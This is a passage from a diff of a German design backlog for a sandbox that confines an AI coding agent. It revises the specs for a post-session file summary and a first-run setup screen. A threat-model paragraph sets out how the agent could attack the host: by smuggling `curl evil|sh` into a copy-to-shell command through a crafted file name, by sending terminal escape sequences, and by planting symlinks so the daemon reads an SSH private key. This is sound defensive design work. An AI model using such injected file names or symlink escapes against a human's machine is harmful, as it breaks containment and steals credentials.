+### Stand (2026-09-04): Größe XL, zwei Teile, neun Fehler in der ersten Fassung, Kanal richtig verstanden
+
+Audit von 28 Agenten gegen den Code: 21 Widersprüche, 9 blockierend, oben im Text korrigiert. Richtig war die Sache selbst: `/work` als Kanal, `openat2` per `rustix` schon im Baum, keine neue Abhängigkeit für die Safe-Open-Hälfte, `RESOLVE_BENEATH` zwingend. Falsch war fast jede Einzelheit der Anbindung. Ein Commit über sechs Crates, Proto und Dart wäre nicht mehr prüfbar; deshalb Teil a und Teil b, getrennt committet, und XL statt M.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
+- Migration `V3__session_summary.sql` unter `src/migrations/`: V3 und V4 sind vergeben (`V3__host_suffix.sql`, `V4__flow_error.sql`), das Verzeichnis heißt `migrations/`, und `migrations_are_numbered_without_gaps` erzwingt V5.
+- `--ro-bind /dev/null` für Masken: seit HUM-011 `--ro-bind-data` aus einem versiegelten memfd; `/dev/null` antwortet auf `nodev` mit `EACCES`. `docs/SECURITY.md` sagt es an zwei Stellen noch falsch; das gehört in Teil a.
+- „Maske, wenn der Pfad **oder das Elternverzeichnis** existiert": der Code verlangt den Pfad selbst (`present_under_work`), mit Grund. Die daraus folgende Lücke (`.git/hooks` fehlt ⇒ Hook landet auf dem Host) war unbenannt und ist jetzt eine zu treffende Entscheidung.
+- `unmask = ["/work/.env"]` ohne Grenze: `.envrc` und `.git/config` sind Pflichtmasken und bleiben es.
+- Die „vollständige" Liste ließ `/var/tmp` weg und kannte `/work/.humanitl` nicht, das sprint-4 verlangt; `.direnv` war als Datei maskiert, ist aber ein Verzeichnis.
+- Snapshot, Scan, Summary und Recorder-Schreiben in einer Datei der Sandbox-Crate: `tools/deps-allow.toml` erlaubt `humanitl-sandbox` nur `core` und `config`; Scan und Summary gehören nach `humanitl-ipc`.
+- `session_summaries(session_id PK)` erlaubte eine Summary je Daemon-Prozess; die Summary hängt am Sandbox-Lauf.
+- `SessionEnded { summary }` als `Sandbox(Status)`-Ereignis: `SandboxEvent.event` hat fünf Arme (`Status`, `CheckResult`, `argv_line`, `Diagnostic`, `LogLine`), keine Summary, kein `SessionSummary`, kein `FileChange`, kein `SymlinkEscape` in der Proto.
+- „Sheet erscheint automatisch beim Session-Ende": das Ende des Agenten wird heute nur per `try_wait()` auf Nachfrage bemerkt; der Wach-Task fehlte.
+- Weiter korrigiert: `humanitl sessions summary` in `cmd/flows.rs` ohne RPC (ADR-018: erst RPC, `Cmd` kennt kein `Sessions`); Detektoren mit `FindingLocation::File` ohne Einstieg für rohe Bytes (`scan` nimmt nur `&HttpRequest`) und ohne die fünf abhängigen Stellen; `blake3` (in `Cargo.lock` null Treffer); `ModeChanged` ohne `mode` in `Entry`; `skip_dirs` mit `.git/objects` als Name; `OpenHow`/`nix` statt der fünf Positionsargumente von `rustix::fs::openat2`; `unmask` mit Tier am Profil; „Open folder" per `xdg-open` ohne Mechanismus in `app/`; „Datei und Zeile" ohne Zeilenrechner; ESC-5 „grün" ohne die zwei Fallnamen.
+
+**Offen, hier nicht entschieden:** die Existenzlücke (`.git/hooks` anlegen oder melden), der Ort von `unmask` (Profil oder Konfiguration), der Zuschnitt in zwei Commits (Empfehlung des Audits; XL gilt für das ungeteilte Issue).
+
+**Seit dem Audit überholt:** HUM-040 ist gemerged (`7fcafd0`); `app/lib/features/sandbox/widgets/argv_sheet.dart` ist das Vorbild für das Sheet; `try_wait()` steht heute in `ipc/src/sandbox.rs` um Zeile 784–808, nicht 429.
+
+**Aus dem Audit nicht bestätigt:** die Aussage, `BACKLOG.md:115` und `BACKLOG.md:293` nennten `/dev/null` — `BACKLOG.md` enthält die Zeichenkette nicht; nur `docs/SECURITY.md` (zwei Stellen) trägt die veraltete Aussage.
+
+**Feindliche Eingabe:** drei Stellen, eine davon scharf. (1) Dateinamen und Symlink-Ziele unter `/work` schreibt der Agent, und die erste Fassung setzte sie in `CopyCommand("rm '{host_path}'")` — ein `'` im Namen macht daraus `rm 'x'; curl evil|sh; ''` in der Shell des Menschen; deshalb `shlex::try_quote` oder kein Befehl. (2) Dieselben Namen laufen durch die CLI-Tabelle ins Terminal (`render.rs::one_line` säubert keine Escape-Sequenzen; OSC 52/8 und `\r` sind der in BACKLOG.md 4.2 deklarierte Kanal); deshalb `sanitize_note` vor Anzeige, Diagnostic und CLI, mit Längendeckel. (3) Der zweite Snapshot läuft host-seitig als Daemon-Benutzer über den Host-Pfad, und der Agent legt während des Laufs Symlinks an; ohne `RESOLVE_BENEATH | NO_SYMLINKS` liest der Daemon `~/.ssh/id_ed25519` und schreibt dessen Fund in die Summary. Der Fallback für alte Kernel muss dieselbe Garantie halten: `openat` mit `O_NOFOLLOW` je Komponente, kein `Path::canonicalize`, kein `read_dir` auf einem zusammengesetzten Pfad, `escapes` rein lexikalisch. Dazu Budgets gegen Erschöpfung. „Open folder" nimmt den Pfad aus der Konfiguration, nie aus der Summary.
+
 ### Fallstricke
-- `masked_files` über `/dev/null` bedeutet: der Agent kann die Datei nicht lesen **und** Schreibversuche scheitern mit `EACCES`/`EPERM` (read-only bind). Tools, die `.env` erwarten, sehen eine leere Datei; das ist gewollt und wird in `docs/SECURITY.md` beschrieben.
+- `masked_files` über `--ro-bind-data` bedeutet: der Agent kann die Datei nicht lesen **und** Schreibversuche scheitern (read-only bind). Tools, die `.env` erwarten, sehen eine leere Datei; das ist gewollt und wird in `docs/SECURITY.md` beschrieben.
 - Hash-Vergleich statt nur mtime, weil Agents `touch` verwenden und manche Tools mtime erhalten.
 - `.git/index` ändert sich bei jedem `git status` des Agenten; als `Modified` listen, aber im UI unter „Git-Metadaten" zusammenfassen, nicht als Finding.
 - Kein Scan von Binärdateien; NUL-Heuristik dokumentieren.
-- Der Snapshot läuft host-seitig als Daemon-User über den Host-Pfad, nicht in der Sandbox. Deshalb `RESOLVE_BENEATH` zwingend: ein während der Session angelegter Symlink darf den Snapshot nicht aus `/work` hinausführen.
+- Die Findings-Crate gibt Werte nie heraus (nur Hash, Ort, Bereich, maskierter Anfang); das gilt für Dateien genauso.
+- `daemon/Cargo.toml` fasst nur der Elternagent an; Teil b braucht dort nichts Neues, solange `sha256` statt `blake3` gilt.
 
 ### Referenzen
-BACKLOG.md 4.2 (Kanal `/work`), 4.5 ESC-5, ADR-002; CONVENTIONS.md 3.4. `openat2(2)`, bwrap `--ro-bind`, Blake3 (Crate `blake3`).
+BACKLOG.md 4.2 (Kanal `/work`), 4.5 ESC-5, ADR-002, ADR-018; CONVENTIONS.md 3.4, 3.8, 4.11, 4.13, 4.17; `backlog/sprint-4.md` HUM-069 (`sandbox_masks_dot_humanitl`). `openat2(2)`, bwrap `--ro-bind-data`, `rustix::fs::openat2`, `sha2`.
 
 ---
 
 ## HUM-044 · Setup-Flow
-Sprint: 3 · Größe: M · Abhängigkeiten: HUM-019, HUM-039, HUM-041, HUM-062, HUM-063, HUM-066 · Blockiert: HUM-046
+Sprint: 3 · Größe: XL · Abhängigkeiten: HUM-019, HUM-039, HUM-040, HUM-041, HUM-062, HUM-063, HUM-066, HUM-075; in Teilen HUM-069 (jeder Schreibweg in die Konfiguration) · Blockiert: HUM-046, HUM-076
 
 ### Kontext
 Usability-Review §1: Der erste Start darf nicht in eine leere Queue führen, sondern in eine Checkliste mit vier Punkten. Die drei Grundentscheidungen (LLM, Projekt, Start) sind die `basic`-Stufe aus ADR-011. Fehlender Daemon ist kein Modal, sondern der Setup-Screen mit einem Ein-Zeilen-Befehl und Live-Indikator. Der erste gehaltene Request bekommt einen Coach-Mark.
 
 ### Ziel
-`SetupScreen` unter `features/setup` zeigt vier Checks: Daemon, LLM, Projekt, Sandbox. Jeder Check hat Status-Punkt, eine Aktion und bei Fehlschlag eine Diagnostic-Karte. Alle vier grün ⇒ Button „Start agent" aktiv ⇒ Navigation zum Intercept-Screen mit Sandbox-Screen als zweitem Tab. Die App startet in den Setup-Screen, wenn einer der vier Checks nicht grün ist, sonst direkt in Intercept. Ein Coach-Mark erscheint genau einmal am ersten gehaltenen Request.
+`SetupScreen` unter `features/setup` zeigt vier Checks: Daemon, LLM, Projekt, Sandbox. Jeder Check hat Status-Punkt, eine Aktion und bei Fehlschlag eine Diagnostic-Karte. Alle vier grün ⇒ Button „Start agent" aktiv ⇒ Navigation zum Intercept-Screen; die Sandbox ist der vierte Eintrag der Leiste (`Section.sandbox`, `Ctrl+4`), kein „zweiter Tab". Die App startet in den Setup-Screen, wenn einer der vier Checks nicht grün ist, sonst direkt in Intercept. Ein Coach-Mark erscheint genau einmal am ersten gehaltenen Request.
 
 ### Nicht-Ziel
-Kein Onboarding-Video, keine Tour durch alle Screens. Keine Installation von OpenCode oder bwrap durch die App selbst (nur Befehle zum Kopieren). Kein Settings-Screen (HUM-069).
+Kein Onboarding-Video, keine Tour durch alle Screens. Keine Installation von OpenCode oder bwrap durch die App selbst (nur Befehle zum Kopieren). Kein Settings-Screen (HUM-069). **Kein Schreiben in `config.toml`:** es gibt im Repository keinen Schreibweg (`SetConfig` ist `unimplemented("SetConfig", "HUM-069")`, `humanitl config` hat nur `get` und `schema`, `daemon/crates/config` schreibt nichts). Der gewählte Ordner reist in `Sandbox(Start).work_dir` (wie HUM-040 es schon tut, CONVENTIONS 4.17), das Endpoint-Feld und das Coach-Mark-Flag warten auf HUM-069 oder bleiben in der App. Keine Socket-Aktivierung (siehe Spezifikation). Kein zweiter Preflight-RPC neben `Doctor`.
 
 ### Betroffene Pfade
-- `app/lib/features/setup/setup_screen.dart` (neu)
+- `app/lib/features/setup/setup_screen.dart` (vorhanden, 125 Zeilen Platzhalter mit `HDiagnosticCard`, `FixControl`, `setup-retry`; der Vier-Zeilen-Rumpf ersetzt den Körper)
 - `app/lib/features/setup/providers/setup_provider.dart` (neu)
-- `app/lib/features/setup/widgets/{setup_check_row.dart, daemon_check.dart, llm_check.dart, project_check.dart, sandbox_check.dart, coach_mark.dart}` (neu)
-- `app/lib/app.dart`: Start-Routing
-- `daemon/bin/humanitl/src/cmd/daemon.rs`: `daemon install|status`
-- `packaging/systemd/humanitld.service`, `humanitld.socket` (neu)
-- `daemon/crates/sandbox/src/preflight.rs` (neu): Host-Voraussetzungen (bwrap vorhanden, Version, user namespaces)
-- ARB: `setup_*`
+- `app/lib/features/setup/widgets/{setup_check_row.dart, daemon_check.dart, llm_check.dart, project_check.dart, sandbox_check.dart}` (neu)
+- `app/lib/core/ui/`: alles, was Setup mit einem anderen Feature teilt (Ordner-Knopf, Endpoint-Feld); `tools/check-deps.sh` verbietet jeden Import zwischen Features außer `shell`. `WorkDirPicker` liegt in `features/sandbox` und wird von dort nach `core/ui` gehoben; ein `LlmEndpointField` existiert nirgends (HUM-039 ist nur daemon-seitig gebaut).
+- `app/lib/features/intercept/widgets/coach_mark.dart` (neu): neben der Aktionsleiste, auf die er zeigt; Popover als eigenes Widget in `app/packages/ui`
+- `app/lib/features/shell/connection_gate.dart`, `shell_screen.dart`: Setup als Zustand **in** der Shell (sechster Abschnitt oder Overlay über dem `IndexedStack`), nicht als Ersatz — heute rendert `ConnectionGate` `SetupScreen` statt `ShellScreen`, und Header wie `Shortcuts(shellShortcuts())` entstehen erst in `ShellScreen.build`
+- `app/lib/features/shell/providers/connection.dart`: Timer, der bei `ConnectionFailed` alle 2 s `retry()` ruft; der Doc-Kommentar dort begründet heute das Gegenteil und wird ergänzt
+- `app/lib/core/ipc/daemon_client.dart`, `grpc_daemon_client.dart`, `fake_daemon_client.dart`: `doctor()` und `probeLlm(endpoint)` (beide fehlen; der Daemon implementiert `ProbeLlm` seit HUM-039)
+- `daemon/crates/sandbox/src/preflight.rs` (neu): alle fünf Ergebnisse statt des ersten Fehlers (`BwrapBackend::detect` bricht beim ersten ab)
+- `daemon/crates/ipc/src/server.rs`: `Doctor` implementieren (heute `unimplemented("Doctor", "HUM-075")`), `daemon/crates/ipc/tests/fake_parity.rs`
+- `daemon/bin/humanitl/src/cmd/doctor.rs` (neu), `cli.rs`: `humanitl doctor [--json]` (ADR-018; die CLI-Hälfte fehlte in der ersten Fassung)
+- `daemon/bin/humanitl/src/cmd/daemon.rs`, `cli.rs`: `daemon install` (heute nur `Status`)
+- `daemon/crates/sandbox/src/bwrap.rs`: `INSTALL_COMMAND` (Konstante `"sudo apt install bubblewrap"`) wird zur Funktion über `/etc/os-release`
+- `packaging/systemd/humanitld.service` (neu; das Verzeichnis hält nur `.gitkeep`)
+- `daemon/crates/core-types/src/diagnostics/codes.rs`: `SANDBOX_017`, `SANDBOX_018`, `LLM_008`, ein `CONFIG_0xx` (geteilte Datei; anhängen), `docs/DIAGNOSTICS.md` neu erzeugen
+- ARB: `setup*` (camelCase)
 
 ### Spezifikation
 
@@ -1177,104 +1324,127 @@ enum CheckState { unknown, checking, ok, failed }
 enum CheckKind { daemon, llm, project, sandbox }
 ```
 
-Ablauf (Schritt-Diagramm):
+Ablauf:
 
 ```
 App start
-  └─ daemon: connect UDS ──ok──> GetInfo ──version ok──> [daemon ok]
+  └─ daemon: connect UDS ──ok──> GetInfo ──version ok──> [daemon ok]        (connectionStateProvider, vorhanden)
         │ fail                      │ major mismatch
         ▼                           ▼
      DAEMON_001                  DAEMON_002
-  └─ llm:  config.llm.endpoint set? ──no──> LLM_000 (Info: "Not configured") [action: field + Test (HUM-039)]
-        └─ yes ──> ProbeLlm ──ok──> [llm ok, models chip]   / fail ──> LLM_001..003
-  └─ project: config.sandbox.work_dir set & exists & readable? ──no──> PROJECT_001 [action: picker]
-        └─ .humanitl/profile.toml present? ──> resolve() ──> CONFIG_003/004 if any
-  └─ sandbox: SandboxPreflight RPC ──> bwrap found (SANDBOX_001), version ≥ 0.8 (SANDBOX_002),
-        user namespaces enabled (SANDBOX_003: /proc/sys/kernel/unprivileged_userns_clone or apparmor restriction),
-        seccomp available (SANDBOX_004), $XDG_RUNTIME_DIR writable (SANDBOX_005), agent preflight (AGENT_001..002 from HUM-037)
+  └─ llm:  Sandbox(Status).llm_endpoint leer? ──ja──> LLM_008 (Info: "Not configured")
+        └─ gesetzt ──> ProbeLlm ──ok──> [llm ok, models chip]   / fail ──> LLM_001..003, LLM_006, LLM_007
+  └─ project: Sandbox(Status).work_dir gesetzt und Sandbox(Plan) ohne Blocking? ──nein──> CONFIG_0xx "kein Ordner" bzw. SANDBOX_005
+  └─ sandbox: Doctor() ──> bwrap (SANDBOX_001), version ≥ 0.8 (SANDBOX_002), userns (SANDBOX_003),
+        seccomp im Kernel (SANDBOX_017), $XDG_RUNTIME_DIR gesetzt und 0700 (SANDBOX_018), llm; agent preflight (AGENT_001..002)
 All ok ──> "Start agent" enabled ──> Sandbox(Start) ──> Isolation checks (HUM-041) ──> Intercept screen
 ```
 
-Diagnostics dieses Issues:
+Endpoint, `work_dir`, `work_mode` und Profil kommen aus `Sandbox(Status)` (`Status.llm_endpoint`, `work_dir`, `work_mode`, `profile`; gefüllt in `daemon/crates/ipc/src/sandbox.rs`), nicht aus `GetConfig` — der ist unimplementiert, und `DaemonClient` hat keine Konfigurationsmethode. Das Auflösen von `.humanitl/profile.toml` entfällt aus diesem Issue; wo es später gezeigt wird, heißen die Befunde `CONFIG_003` und `CONFIG_007..009` (`CONFIG_004` ist „Laufzeitverzeichnis ist ein Ersatz").
 
-| Code | Severity | why (en) | fix |
+Diagnostics dieses Issues (Register `codes.rs`; eine Nummer wird nie wiederverwendet):
+
+| Code | Severity | why (en) | fix (genau **eine** `FixAction`; `Diagnostic.fix` ist `Option<FixAction>`, die Leitung ein `oneof`) |
 |---|---|---|---|
-| `DAEMON_001` | Blocking | "Humanitl's background service is not running. The app cannot see any traffic without it." | `InstallService` (führt `humanitl daemon install` aus, das die Unit nach `~/.config/systemd/user/` schreibt und `systemctl --user enable --now humanitld.socket` aufruft) plus `CopyCommand("systemctl --user start humanitld")` |
-| `DAEMON_002` | Blocking | "The service speaks protocol v{x}, this app expects v{y}. Update both from the same release." | `OpenUrl(releases)` |
-| `PROJECT_001` | Blocking | "No project folder chosen. The agent needs exactly one folder to work in." | `ChangeSetting { key: "sandbox.work_dir" }` |
-| `PROJECT_002` | Blocking | "The folder {path} is not readable by your user." | `CopyCommand("ls -ld '{path}'")` |
-| `SANDBOX_001` | Blocking | "bubblewrap (bwrap) is not installed. It is the sandbox Humanitl runs the agent in." | `CopyCommand("sudo apt install bubblewrap")` (Distribution erkannt über `/etc/os-release`: apt / dnf / pacman / zypper) |
+| `DAEMON_001` | Error (so erzeugt der Client sie heute, `client_diagnostics.dart`) | "Humanitl's background service is not running. The app cannot see any traffic without it." | `InstallService`; der Befehl `systemctl --user start humanitld` steht im `why`, nicht als zweite Aktion |
+| `DAEMON_002` | Blocking | "The service speaks protocol v{x}, this app expects v{y}. Update both from the same release." | `OpenUrl(releases)` — `FixControl` rendert das heute als Kopierknopf; wer wirklich öffnen will, nennt `url_launcher` als neue Abhängigkeit |
+| `CONFIG_0xx` (frei ab 010) | Blocking | "No project folder chosen. The agent needs exactly one folder to work in." | kein `ChangeSetting` (verlangt einen `value` und einen Schreibweg); die Zeile öffnet den Ordner-Knopf |
+| `SANDBOX_005` (vorhanden) | Blocking | „Projektordner nicht beschreibbar" | wie in `bwrap.rs` |
+| `SANDBOX_001` | Blocking | "bubblewrap (bwrap) is not installed. It is the sandbox Humanitl runs the agent in." | `CopyCommand(<paketmanager> install bubblewrap)`, Distribution aus `/etc/os-release` (`ID`, `ID_LIKE`: apt / dnf / pacman / zypper, sonst apt) |
 | `SANDBOX_002` | Blocking | "bwrap {found} is too old; 0.8.0 or newer is required for --file and seccomp." | wie oben |
 | `SANDBOX_003` | Blocking | "Unprivileged user namespaces are disabled on this system. Rootless sandboxes need them." | `CopyCommand("sudo sysctl -w kernel.unprivileged_userns_clone=1")` bzw. AppArmor-Hinweis auf Ubuntu ≥ 23.10: `CopyCommand("sudo sysctl -w kernel.apparmor_restrict_unprivileged_userns=0")` mit `docs` |
-| `SANDBOX_004` | Blocking | "The kernel has no seccomp filter support." | `docs` |
-| `SANDBOX_005` | Blocking | "$XDG_RUNTIME_DIR is not set or not writable; Humanitl keeps its sockets there." | `CopyCommand("loginctl enable-linger $USER")` |
+| `SANDBOX_017` (neu) | Blocking | "The kernel has no seccomp filter support." | `docs` |
+| `SANDBOX_018` (neu) | Blocking | "$XDG_RUNTIME_DIR is not set or not writable; Humanitl keeps its sockets there." | `CopyCommand("loginctl enable-linger $USER")` |
+| `LLM_008` (neu) | Info | "Not configured" | kein `ChangeSetting`, die Zeile zeigt das Feld |
 
-`daemon install` schreibt:
+`PROJECT_001`/`PROJECT_002` entfallen: es gibt keinen Bereich `PROJECT` in `AREAS`, und `codes_stay_inside_their_area` bricht mit „has no reserved area". `SANDBOX_004` („Isolation-Check fehlgeschlagen") und `SANDBOX_005` („Projektordner nicht beschreibbar") sind vergeben; deshalb 017/018. `LLM_000` liegt außerhalb des Bereichs `LLM` (001..009); 008 und 009 sind frei.
+
+`Doctor` ist der Preflight-RPC: `rpc Doctor(Empty) returns (DoctorReport)` mit `DoctorCheck { id, status, evidence, diagnostic }` und `CheckStatus { OK, WARN, FAIL }` steht in der Proto, und der Fake antwortet schon mit den fünf Kennungen `bwrap`, `userns`, `seccomp`, `runtime_dir`, `llm` (`fake/mod.rs`). Der echte Server liefert `unimplemented("Doctor", "HUM-075")`; HUM-075 erklärt „Blockiert: HUM-044" und muss deshalb vorher gebaut werden — oder seine Maschinen-Hälfte wird hier gebaut. Keine Proto-Änderung.
+
+`daemon install` schreibt genau eine Unit, mit Platzhalter für den Pfad:
 
 ```ini
 # ~/.config/systemd/user/humanitld.service
 [Unit]
 Description=Humanitl moderation daemon
 [Service]
-ExecStart=%h/.local/bin/humanitld
+ExecStart={humanitld}            # aus std::env::current_exe() der CLI, gleiches Verzeichnis
 Restart=on-failure
 NoNewPrivileges=yes
-ProtectHome=read-only
 ReadWritePaths=%h/.local/share/humanitl %h/.config/humanitl %t/humanitl
 PrivateTmp=yes
 RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
-SystemCallFilter=@system-service
+SystemCallFilter=@system-service @mount
 [Install]
 WantedBy=default.target
 ```
 
-```ini
-# ~/.config/systemd/user/humanitld.socket
-[Socket]
-ListenStream=%t/humanitl/daemon.sock
-SocketMode=0600
-DirectoryMode=0700
-[Install]
-WantedBy=sockets.target
-```
+Kein `ProtectHome=read-only`: der Daemon startet `bwrap` als eigenes Kind (`bwrap.rs::supervise`), `sandbox.work_mode` ist per Vorgabe `rw`, und `check_work_dir` lehnt einen nicht beschreibbaren Projektordner mit `SANDBOX_005` ab — mit `ProtectHome=read-only` wäre das jedes Projekt unter `$HOME`. `@system-service` trägt kein `@mount`; bubblewrap mountet und `pivot_root`s. Keine `humanitld.socket`: `listenfd`/`LISTEN_FDS` kommen im Baum nicht vor, und `free_socket()` in `humanitld` verbindet sich beim Start mit einem vorhandenen Socket und weigert sich mit `DAEMON_003`, wenn etwas antwortet — genau das täte ein von systemd gehaltener Socket. Socket-Aktivierung ist ein eigenes Issue mit Eintrag in `daemon/Cargo.toml` (Elternagent). Die Unit gegen ein Projekt unter `$HOME` testen, bevor die Härtung behauptet wird.
 
-Der Daemon unterstützt Socket-Aktivierung (`LISTEN_FDS`, Crate `listenfd`). Der Binary-Pfad in `ExecStart` wird beim Install aus `std::env::current_exe()` der CLI abgeleitet (gleiches Verzeichnis, Name `humanitld`).
+Screen-Layout: zentrierte Spalte, max. 640 px, Titel „Set up Humanitl", vier `SetupCheckRow` (Punkt, Titel, Detail/Diagnostic, Aktion rechts), darunter `HButton(variant: HButtonVariant.primary, …)` „Start agent" (es gibt keinen `HButton.primary`-Konstruktor). Zeilen: Daemon („Background service"), LLM („Your model server" mit Endpoint-Feld aus `core/ui`, ohne Probe je Tastendruck), Project („Project folder" mit dem Ordner-Knopf aus `core/ui`; die Profil-Auswahl entfällt, bis ein RPC Profile listet — heute kennt der Vertrag `profile` nur als String, `available_profiles` löst die CLI lokal auf, und `app/packages/ui` hat kein Select-Widget), Sandbox („Sandbox check" mit `Doctor`-Ergebnis). Der Daemon-Check pollt alle 2 s, solange er rot ist; das kehrt die bewusste Entscheidung in `connection.dart` („Reconnecting is explicit") für den roten Fall um und sagt es im Kommentar dort.
 
-Screen-Layout: zentrierte Spalte, max. 640 px, Titel „Set up Humanitl", vier `SetupCheckRow` (Punkt, Titel, Detail/Diagnostic, Aktion rechts), darunter `HButton.primary("Start agent")`. Zeilen: Daemon („Background service"), LLM („Your model server" mit `LlmEndpointField` aus HUM-039), Project („Project folder" mit `WorkDirPicker` aus HUM-040 und Profil-Auswahl als Dropdown der Profile aus HUM-066), Sandbox („Sandbox check" mit Preflight-Ergebnis). Der Daemon-Check pollt alle 2 s, solange er rot ist (Live-Indikator).
+Modell-Chip: `ProbeLlmResponse.models` sind Namen, die ein unauthentifizierter Server im LAN wörtlich liefert; `ollama_models`/`openai_models` (`llm_probe.rs`) begrenzen weder Länge noch Anzahl, nur den Rumpf (1 MiB). Vor dem Chip: `sanitize_note` in `probe_result_to_proto` (`convert.rs`), Länge und Anzahl deckeln, `maxLines` wie in `agent_ask_card.dart`. Nie ein `CopyCommand` aus einem Modellnamen. `LLM_006` (nicht privat) und `LLM_007` (keine lesbare Adresse) zeigt die Zeile, nicht nur den grünen Fall.
 
-Coach-Mark: Beim ersten `Held`-Flow einer Installation (Flag `ui.coach_marks_seen: ["first_hold"]` in `config.toml`) erscheint über der Aktionsleiste ein Popover mit `setup_coach_first_hold` en "Held because no rule matches (default: ask). Allow sends it unchanged; the response is recorded, not held. Use the arrow to remember a rule." de "Angehalten, weil keine Regel passt (Standard: ask). Senden schickt die Anfrage unverändert; die Antwort wird aufgezeichnet, nicht angehalten. Über den Pfeil kannst du eine Regel merken." Schließen per Klick oder `Esc`, danach nie wieder.
+Coach-Mark: Beim ersten `Held`-Flow einer Installation erscheint über der Aktionsleiste ein Popover mit `setupCoachFirstHold` en "Held because no rule matches (default: ask). Allow sends it unchanged; the response is recorded, not held. Use the arrow to remember a rule." de "Angehalten, weil keine Regel passt (Standard: ask). Senden schickt die Anfrage unverändert; die Antwort wird aufgezeichnet, nicht angehalten. Über den Pfeil kannst du eine Regel merken." Schließen per Klick oder `Esc`, danach nie wieder. Das Flag lebt in der App, bis ein Konfigurations-Schreibweg existiert: `UiConfig` hat genau `language`, `theme`, `notifications`, `sound` und `deny_unknown_fields`; ein `ui.coach_marks_seen` in `config.toml` wäre heute `CONFIG_001`.
 
 ### Schritte
-1. `preflight.rs` mit den fünf Sandbox-Prüfungen, RPC `SandboxPreflight` (Ergänzung in `Sandbox`-oneof), Diagnostics.
-2. `daemon install|status` in der CLI, Unit-Dateien, `listenfd` im Daemon.
-3. `setupProvider`: vier Checks parallel, Daemon-Poll.
-4. Screen und Widgets, Routing in `app.dart`.
-5. Coach-Mark mit Config-Flag.
-6. Widget-Tests, Golden des Setup-Screens (alle rot, alle grün).
+1. Codes zuerst: `SANDBOX_017`, `SANDBOX_018`, `LLM_008`, `CONFIG_0xx` in `codes.rs` anhängen, `docs/DIAGNOSTICS.md` neu erzeugen.
+2. `preflight.rs` mit allen fünf Ergebnissen (Wiederverwendung von `find_program`, `query_version`/`MIN_BWRAP_VERSION`, `probe_user_namespaces` aus `bwrap.rs`; neu: Kernel-seccomp, `$XDG_RUNTIME_DIR`), `Doctor` in `server.rs` mit den fünf Kennungen des Fakes, `fake_parity.rs`, `humanitl doctor [--json]` (Exit 0 bei ok/warn, 3 bei fail), `/etc/os-release`-Leser mit Tabellentest über Fixture-Dateien.
+3. `doctor()` und `probeLlm()` in `DaemonClient`, `GrpcDaemonClient`, `FakeDaemonClient` (geteilte Datei: neu lesen, anhängen).
+4. Setup als Zustand in der Shell (`connection_gate.dart`, `shell_screen.dart`), Retry-Timer in `connection.dart`.
+5. `setupProvider`: vier Checks parallel aus `connectionStateProvider`, `Sandbox(Status)`/`Sandbox(Plan)`, `ProbeLlm`, `Doctor`.
+6. Geteilte Controls nach `core/ui`, Screen und Widgets, Coach-Mark in `features/intercept`, Popover in `app/packages/ui`.
+7. `daemon install` mit einer Unit und `current_exe()`; `FixActionInstallService` in `fix_control.dart` ruft es und löst das Binary neben der laufenden Anwendung auf, nie aus `$PATH` oder einem Konfigurationswert.
+8. ARB, Widget-Tests, Goldens (alle rot, alle grün).
 
 ### Tests
-- `setup_shows_daemon_001_with_install_action` (FakeDaemonClient wirft Connect-Fehler).
+- `setup_shows_daemon_001_with_install_action` (FakeDaemonClient `unavailable()`).
 - `start_button_enabled_only_when_all_ok`.
-- `llm_row_uses_probe` (Provider-Aufruf).
-- `coach_mark_shown_once`: erster Held ⇒ Popover; Flag gesetzt; zweiter Held ⇒ kein Popover.
-- Daemon-Unit: `preflight_detects_missing_bwrap` (PATH leer), `preflight_parses_bwrap_version`.
-- CLI: `daemon install` schreibt beide Units in ein temporäres `XDG_CONFIG_HOME`, Inhalt entspricht der Vorlage.
+- `llm_row_uses_probe`, `llm_row_shows_llm_006_and_007`, `model_chip_is_clamped`.
+- `coach_mark_shown_once`: erster Held ⇒ Popover; zweiter Held ⇒ kein Popover.
+- `setup_keeps_header_and_ctrl_1_while_flows_are_held`.
+- Daemon-Unit: `preflight_reports_all_five`, `preflight_detects_missing_bwrap` (PATH leer), `preflight_parses_bwrap_version`, `install_command_per_os_release`.
+- CLI: `daemon install` schreibt die Unit in ein temporäres `XDG_CONFIG_HOME`, `ExecStart` zeigt auf `current_exe()`-Nachbarn, keine Socket-Unit; `humanitl doctor --json` liefert fünf Zeilen.
 
 ### Akzeptanzkriterien
-- [ ] Frische Installation ohne laufenden Daemon: App zeigt Setup mit `DAEMON_001`, Klick auf Fix installiert und startet die Unit, Zeile wird binnen 4 s grün.
-- [ ] Ohne bwrap: `SANDBOX_001` mit distributionsspezifischem Befehl.
-- [ ] Alle grün ⇒ Start ⇒ Intercept-Screen, Ring im Header grün.
+- [ ] Frische Installation ohne laufenden Daemon: App zeigt Setup mit `DAEMON_001`, Klick auf Fix installiert und startet die Unit, Zeile wird binnen 4 s grün (durch den 2-s-Retry).
+- [ ] Ohne bwrap: `SANDBOX_001` mit distributionsspezifischem Befehl, in der App wie in `humanitl doctor`.
+- [ ] Alle grün ⇒ Start ⇒ Intercept-Screen; der Ring im Header wird grün, sobald HUM-041 gelandet ist (bis dahin grau, `IsolationRingPlaceholder`).
 - [ ] Coach-Mark erscheint genau einmal.
+- [ ] Während des Setups zeigt der Header-Badge gehaltene Flows, und `Ctrl+1` wechselt.
 - [ ] Goldens abgelegt.
 
+### Stand (2026-09-04): Größe XL, neun genannte Codes, RPCs und Widgets gibt es nicht oder sie heißen anders, drei Kriterien enden in einem Schreibweg ohne Schreiber
+
+Audit von 28 Agenten gegen den Code: 20 Widersprüche, 7 blockierend, oben im Text korrigiert. Vorhanden und nutzbar: `find_program`, `query_version`, `probe_user_namespaces` in `bwrap.rs` (drei der fünf Prüfungen; `detect()` bricht beim ersten Fehler ab), der Fake-`Doctor` mit den fünf Kennungen, `rpc Doctor` samt Nachrichten in der Proto, `probe_llm` im Server, `Sandbox(Status)` mit Endpoint, Ordner, Modus und Profil, der Platzhalter-`SetupScreen` mit `HDiagnosticCard` und `FixControl`, `connectionStateProvider` mit Heartbeat und `retry()`, alle sieben `FixAction`-Varianten in `fix_control.dart`, die Widget-Harness mit `unavailable()`/`incompatible()`/`goOffline()`. Ungebaut: `preflight.rs`, `Doctor` im echten Server, `humanitl doctor`, `daemon install`, `doctor()`/`probeLlm()` im Client, Setup in der Shell, Retry-Timer, Provider, vier Zeilen, geteilte Controls, Popover, Coach-Mark, `os-release`. Daher XL statt M.
+
+**Blockierend in der ersten Fassung, jetzt korrigiert:**
+
